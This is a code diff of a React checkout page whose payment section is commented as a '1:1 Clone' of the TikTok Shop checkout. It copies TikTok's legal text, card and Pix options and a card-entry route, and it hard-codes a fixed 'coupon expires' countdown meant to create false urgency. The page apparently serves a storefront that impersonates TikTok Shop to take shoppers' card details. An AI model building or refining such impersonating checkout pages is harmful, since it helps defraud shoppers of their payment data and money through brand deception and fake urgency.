@@ -123,6 +123,7 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
+        {/* Address Section */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
           <div className="flex items-center space-x-2">
             <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
@@ -135,6 +136,7 @@ const Checkout: React.FC = () => {
           </button>
         </div>
 
+        {/* Product Details Section */}
         <div className="bg-white mt-2.5 p-4">
           <div className="flex justify-between items-center mb-3">
             <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
@@ -190,6 +192,7 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
+        {/* Coupons Section */}
         <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
           <div className="flex items-center space-x-2">
             <Ticket size={20} className="text-[#FF2C55]" />
@@ -203,6 +206,7 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
+        {/* Order Summary Section */}
         <div className="bg-white mt-2.5 p-4">
           <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
           <div className="space-y-4">
@@ -241,51 +245,87 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        <div className="bg-white mt-2.5 p-4 space-y-6">
-          <h3 className="text-[15px] font-bold text-gray-900">Forma de pagamento</h3>
-          <div className="space-y-3">
-            <div className="flex items-center justify-between cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
+        {/* Payment Methods Section (1:1 Clone) */}
+        <div className="bg-white mt-2.5 p-4 space-y-4">
+          <h3 className="text-[16px] font-bold text-gray-900 mb-1">Forma de pagamento</h3>
+          
+          {/* Card Option */}
+          <div className="space-y-3 cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
+            <div className="flex items-center justify-between">
               <div className="flex items-center space-x-2">
-                <div className="w-6 h-6 bg-gray-50 flex items-center justify-center border border-gray-100">
-                  {cardData ? <CreditCard size={14} className="text-[#00BFA5]" /> : <Plus size={14} className="text-gray-400" />}
+                <div className="w-5 h-5 flex items-center justify-center bg-[#F1F1F1] rounded-sm">
+                   <Plus size={14} className="text-gray-400" />
                 </div>
-                <span className="text-[14px] font-medium text-gray-900">
+                <span className="text-[15px] font-medium text-gray-900">
                   {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                 </span>
               </div>
               <ChevronRight size={18} className="text-gray-300" />
             </div>
-            <div className="flex items-center justify-between cursor-pointer border-t pt-5" onClick={() => setPaymentMethod('pix')}>
-              <div className="flex items-center space-x-3">
-                <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
-                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
+            
+            <div className="flex flex-col space-y-3 pl-7">
+              <div className="flex gap-1.5">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
+                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
+                <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-4" alt="Elo" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-4" alt="Amex" />
+              </div>
+              
+              <div className="flex items-center space-x-1.5 w-fit">
+                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-2 py-0.5 rounded-sm border border-[#FFD9E0] flex items-center">
+                  Sem juros em até 3 parcelas <ChevronRight size={12} className="ml-0.5" />
                 </div>
-                <span className="text-[14px] font-medium text-gray-900">Pix</span>
               </div>
-              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
-                {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
-              </div>
+              
+              <span className="text-[12px] text-gray-400">Pague em até 12 parcelas</span>
             </div>
+          </div>
+
+          {/* Pix Option */}
+          <div className="flex items-center justify-between cursor-pointer border-t pt-4 mt-2" onClick={() => setPaymentMethod('pix')}>
+            <div className="flex items-center space-x-3">
+              <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
+                <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
+              </div>
+              <span className="text-[15px] font-medium text-gray-900">Pix</span>
+            </div>
+            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
+              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
+            </div>
+          </div>
+
+          {/* More Methods (Google Pay) */}
+          <div className="flex items-center justify-between pt-4 border-t mt-2">
+            <div className="h-6 w-10 border rounded flex items-center justify-center bg-white">
+               <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-3" alt="Google Pay" />
+            </div>
+            <button className="flex items-center text-[14px] text-gray-900 font-medium">
+              Ver todos <ChevronRight size={16} className="ml-0.5" />
+            </button>
           </div>
         </div>
 
+        {/* Legal Text Section */}
         <div className="p-4 space-y-4">
-          <p className="text-[11px] text-gray-500 leading-tight">
+          <p className="text-[12px] text-gray-600 leading-tight">
             Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
           </p>
-          <div className="bg-[#FFF1F3] p-3.5 flex items-center space-x-2 rounded-sm border border-[#FFD9E0]/30">
+          
+          {/* Economy Banner */}
+          <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 rounded-sm border border-[#FFD9E0]/20">
             <span className="text-[16px]">😊</span>
-            <span className="text-[12px] text-[#FF2C55] font-medium leading-tight">
+            <span className="text-[13px] text-[#FF2C55] font-medium leading-tight">
               Você está economizando R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')} nesse pedido.
             </span>
           </div>
         </div>
       </div>
 
+      {/* Footer Fixed */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
         <div className="max-w-[600px] mx-auto">
           <div className="flex justify-between items-center mb-3 px-1">
-            <span className="text-[15px] font-bold text-gray-900">Total (1 item)</span>
+            <span className="text-[16px] font-bold text-gray-900">Total (1 item)</span>
             <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
           </div>
           <Button 
@@ -294,7 +334,7 @@ const Checkout: React.FC = () => {
             disabled={isPlacingOrder}
           >
             <span className="text-[17px] mb-0.5">{isPlacingOrder ? "Processando..." : "Fazer pedido"}</span>
-            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:43:46</span>
+            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:23:39</span>
           </Button>
         </div>
       </div>
